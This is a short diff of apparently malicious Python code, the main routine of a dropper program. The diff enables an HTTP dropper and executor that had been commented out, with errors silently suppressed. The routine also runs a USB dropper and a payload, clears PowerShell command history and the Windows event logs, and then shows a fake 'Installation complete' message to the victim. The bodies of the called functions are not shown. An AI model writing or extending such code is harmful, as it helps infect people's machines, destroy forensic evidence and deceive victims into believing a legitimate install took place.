@@ -164,9 +164,12 @@ def main():
     Payload()
     USBDROPPER = UsbDropper()
     USBDROPPER.usbdropper()
-    #HTTPDROPPER = HttpDropper()
-    #HTTPDROPPER.dropper()
-    #HTTPDROPPER.executor()
+    HTTPDROPPER = HttpDropper()
+    try:
+        HTTPDROPPER.dropper()
+        HTTPDROPPER.executor()
+    except:
+        pass
     ClearPsCommandHistory()
     ClearingEventViewer()
     windll.user32.MessageBoxW(0, "Installation complete", "Success", 0x40)
